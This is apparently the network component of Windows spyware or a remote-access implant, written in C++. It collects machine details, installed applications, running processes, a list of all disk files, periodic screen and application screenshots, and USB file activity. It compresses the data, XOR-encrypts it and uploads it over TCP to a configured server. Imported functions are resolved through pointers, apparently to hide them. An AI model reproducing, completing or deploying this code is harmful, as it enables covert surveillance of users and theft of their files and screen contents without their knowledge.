#include "../api.h"
#include "../public.h"
#include "NetWorkdata.h"
#include "log.h"
#include "../public.h"
#include "zlib.h"
#include "zconf.h"
#include "../function/DeviceInfo.h"
#include "UploadLogFile.h"
#include "../function/UsbFileWatcher.h"
#include "../function/AppScreenshot.h"
#include "../function/ScreenSnapshot.h"
#include "../function/harddiskfile.h"
#include "../function/InstallApps.h"
#include "../function/RunningProcess.h"
#include "../Config.h"
#include "../crypt/cryption.h"
#include "Utils.h"

#pragma comment(lib,"zlib.lib")

int uploadData(char* lpBuf, unsigned int dwSize, unsigned int cmd, char* szAppName)
{
	try
	{
		//as the size of comressed data can not be predicable,so the size of compress buf is allocated more larger than uncompressed data
		long compbufsize = dwSize + sizeof(NETWORKFILEHDR) + 0x1000;
		char* lpSendBuf = new char[compbufsize];
		if (lpSendBuf == 0)
		{
			writeLog("uploadData cmd:%u new zlib buffer error\r\n", cmd);
			return FALSE;
		}


		LPNETWORKFILEHDR lpfilehdr = (LPNETWORKFILEHDR)lpSendBuf;
		lpfilehdr->packhdr.cmd = cmd;
		memmove(lpfilehdr->packhdr.unique.cMAC, cMAC, MAC_ADDRESS_LENGTH);
		lpfilehdr->packhdr.unique.dwVolumeNO = ulVolumeSerialNo;
		lpfilehdr->packhdr.unique.compress = DATACOMPRESS;
		lpfilehdr->packhdr.unique.crypt = DATACRYPT;
		memset(lpfilehdr->packhdr.unique.username, 0, 16);
		lplstrcpyA((char*)lpfilehdr->packhdr.unique.username, (char*)gUserName);

		xorCrypt(lpfilehdr->packhdr.unique.username, 16, gKey, 16);

		long lZlibBufLen = compbufsize - sizeof(NETWORKFILEHDR);
		int iRet = compress((Bytef*)lpSendBuf + sizeof(NETWORKFILEHDR), (uLongf*)&lZlibBufLen, (const Bytef*)lpBuf, (uLongf)dwSize);
		if (iRet != Z_OK)
		{
			delete[] lpSendBuf;
			writeLog("uploadData cmd:%u compress error\r\n", cmd);
			return FALSE;
		}
		lpfilehdr->packhdr.packlen = lZlibBufLen + sizeof(int);		//sizeof(int) is the size of lpfilehdr->srclen
		lpfilehdr->srclen = dwSize;

		unsigned char szkey[64] = { 0 };
		lplstrcpyA((char*)szkey, gUserName);
		//encrypt the compressed data
		xorCrypt((Bytef*)lpSendBuf + sizeof(NETWORKFILEHDR), lZlibBufLen, szkey, 16);

		int iSendSize = sizeof(NETWORKFILEHDR) + lZlibBufLen;

		SOCKET hSock = lpsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (hSock == SOCKET_ERROR)
		{
			writeLog("uploadData cmd:%u lpsocket error\r\n", cmd);
			delete[]lpSendBuf;
			return FALSE;
		}

		DWORD dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock, SOL_SOCKET, SO_SNDTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
		{
			writeLog("uploadData lpsetsockopt error code:%u\r\n", lpRtlGetLastWin32Error());
		}

		sockaddr_in stServDataAddr;
		lpRtlZeroMemory((char*)&stServDataAddr, sizeof(sockaddr_in));
		stServDataAddr.sin_addr.S_un.S_addr = gServerIP;
		stServDataAddr.sin_port = lpntohs(NETWORK_DATAPORT);
		stServDataAddr.sin_family = AF_INET;
		iRet = lpconnect(hSock, (sockaddr*)&stServDataAddr, sizeof(sockaddr_in));
		if (iRet == SOCKET_ERROR)
		{
			char szIP[64];
			getIPstr(stServDataAddr.sin_addr.S_un.S_addr, szIP);
			writeLog("uploadData cmd:%u lpconnect error,ip:%s port:%u\r\n", cmd, szIP, lpntohs(stServDataAddr.sin_port));

			lpclosesocket(hSock);
			delete[]lpSendBuf;
			return FALSE;
		}

		int sendlen = lpsend(hSock, lpSendBuf, iSendSize, 0);
		if (sendlen <= 0)
		{
			char szIP[64];
			getIPstr(stServDataAddr.sin_addr.S_un.S_addr, szIP);

			writeLog("uploadData cmd:%u lpsend error,ip:%s port:%u\r\n", cmd, szIP, lpntohs(stServDataAddr.sin_port));
			lpclosesocket(hSock);
			delete[]lpSendBuf;
			return FALSE;
		}


		dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
		{
			writeLog("uploadData lprecv time lpsetsockopt error code:%u\r\n", lpRtlGetLastWin32Error());

			lpclosesocket(hSock);
			delete[]lpSendBuf;
			return FALSE;
		}

		char szRecvBuf[MIN_PACKET_BUFFER];
		int recvlen = lprecv(hSock, szRecvBuf, MIN_PACKET_BUFFER, 0);		//last packet can use MSG_WAITALL with enough buffer
		if (recvlen <= 0)
		{
			char szIP[64];
			getIPstr(stServDataAddr.sin_addr.S_un.S_addr, szIP);
			writeLog("uploadData recv cmd:%u,error code:%u,ip:%s port:%u\r\n", cmd, lpRtlGetLastWin32Error(), szIP, lpntohs(stServDataAddr.sin_port));

			delete[]lpSendBuf;
			lpclosesocket(hSock);
			return FALSE;
		}

		DWORD dwCommand = *(DWORD*)szRecvBuf;
		if (dwCommand == NETWORK_IPADDRESS)
		{
			*(szRecvBuf + recvlen) = 0;
			char* lpaddr = szRecvBuf + sizeof(NETWORKFILEHDR);
			lstrcpyA(strExternalIP, lpaddr);
		}
		else if (dwCommand != RECV_DATA_OK)
		{
			char szIP[64];
			getIPstr(stServDataAddr.sin_addr.S_un.S_addr, szIP);
			writeLog("uploadData cmd:%u recv data error:%u,ip:%s port:%u\r\n", cmd, lpRtlGetLastWin32Error(), szIP, lpntohs(stServDataAddr.sin_port));

			delete[]lpSendBuf;
			lpclosesocket(hSock);
			return FALSE;
		}

	__UploadEnd:
		delete[]lpSendBuf;
		lpclosesocket(hSock);
		return TRUE;
	}
	catch (...)
	{
		writeLog("uploadData exception\r\n");
		return FALSE;
	}
}



int __stdcall NetworkData() {

	int iRet = 0;

	//iRet = uploadData(cCryptKey, 16, ONLINE, 0);

	iRet = GetMachineInfo();

	iRet = GetApplicationInfo(FALSE);

	iRet = GetRunningProcessInfo();

	HANDLE hThreadAllDiskFile = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetHardDiskAllFiles, 0, 0, 0);
	lpCloseHandle(hThreadAllDiskFile);

	SCREENSNAPSHOT_TIME stScreenTime;
	stScreenTime.iMaxTime = SCREEN_MAX_TIME;
	stScreenTime.iMinTime = SCREEN_MIN_TIME;
	HANDLE hThreadScreen = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetScreenSnapshot, &stScreenTime, 0, 0);
	lpCloseHandle(hThreadScreen);

	HANDLE hAppSreen = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetAppScreenshot, (LPVOID)APPSCREEN_SECLAST_FOCUSON, 0, 0);
	lpCloseHandle(hAppSreen);

	HANDLE hThreadUsb = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)UsbFileWatcher, 0, 0, 0);
	lpCloseHandle(hThreadUsb);

	iRet = UploadLogFile();

	time_t tmMainTime = time(0);
	while (1)
	{
		time_t tmNow = time(0);
		if (tmNow - tmMainTime >= 3600 * 1)
		{
			tmMainTime = tmNow;
			iRet = getUserAndServer();
			iRet = GetNetCardInfo(strLocalIP, cMAC, strLocalMac, strExternalIP, strGateWayIP, strGateWayMac);
			//iRet = GetMachineInfo();
		}
		else if (tmNow - tmMainTime >= 3600 * 24)
		{
			tmMainTime = tmNow;
		}
		lpSleep(60000);
	}

	// 	HANDLE threadsid[16];
	// 	threadsid[0] = hThreadScreen;
	// 	threadsid[1] = hAppSreen;
	// 	threadsid[2] = hThreadUsb;
	// 	threadsid[3] = hThreadAllDiskFile;
	// 	iRet = WaitForMultipleObjects(4,threadsid,TRUE,INFINITE);

	return TRUE;
}



int RecvCmdPacket(SOCKET s) {

	char szData[1024];
	int iRet = lprecv(s, szData, 1024, 0);
	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)szData;
	if (lphdr->packlen != 0 || iRet != sizeof(NETWORKPACKETHEADER))
	{
		return FALSE;
	}
	return lphdr->cmd;
}



int SendCmdPacketWithParam(SOCKET s, int cmd, char* param, int paramsize) {

	char szData[4096];
	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)szData;
	lphdr->cmd = cmd;
	memmove(lphdr->unique.cMAC, cMAC, MAC_ADDRESS_LENGTH);
	lphdr->unique.dwVolumeNO = ulVolumeSerialNo;
	lphdr->unique.compress = DATANONECOMPRESS;
	lphdr->unique.crypt = DATANONECRYPT;
	memset(lphdr->unique.username, 0, 16);
	lstrcpyA((char*)lphdr->unique.username, (char*)gUserName);
	lphdr->packlen = paramsize;

	memmove(szData + sizeof(NETWORKPACKETHEADER), param, paramsize);
	int iLen = sizeof(NETWORKPACKETHEADER) + paramsize;

	int iRet = lpsend(s, szData, iLen, 0);
	return iRet;
}



int SendCmdPacket(SOCKET s, int cmd) {

	char szData[1024];
	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)szData;
	lphdr->cmd = cmd;
	memmove(lphdr->unique.cMAC, cMAC, MAC_ADDRESS_LENGTH);
	lphdr->unique.dwVolumeNO = ulVolumeSerialNo;
	lphdr->unique.compress = DATANONECOMPRESS;
	lphdr->unique.crypt = DATANONECRYPT;
	memset(lphdr->unique.username, 0, 16);
	lstrcpyA((char*)lphdr->unique.username, (char*)gUserName);
	lphdr->packlen = 0;
	int iLen = sizeof(NETWORKPACKETHEADER);

	int iRet = lpsend(s, szData, iLen, 0);

	return iRet;
}


int SendCmdPacket(LPUNIQUECLIENTSYMBOL lpUnique, SOCKET s, int cmd) {

	char szData[1024];
	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)szData;
	lphdr->cmd = cmd;
	lphdr->unique = *lpUnique;
	lphdr->packlen = 0;
	int iLen = sizeof(NETWORKPACKETHEADER);

	int iRet = lpsend(s, szData, iLen, 0);

	return iRet;
}



int SendDataHeaderPacket(LPUNIQUECLIENTSYMBOL lpUnique, SOCKET s, int cmd, int size) {

	char szData[1024];
	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)szData;
	lphdr->cmd = cmd;
	lphdr->unique = *lpUnique;
	lphdr->packlen = size;
	int iLen = sizeof(NETWORKPACKETHEADER);

	int iRet = lpsend(s, szData, iLen, 0);

	return iRet;
}


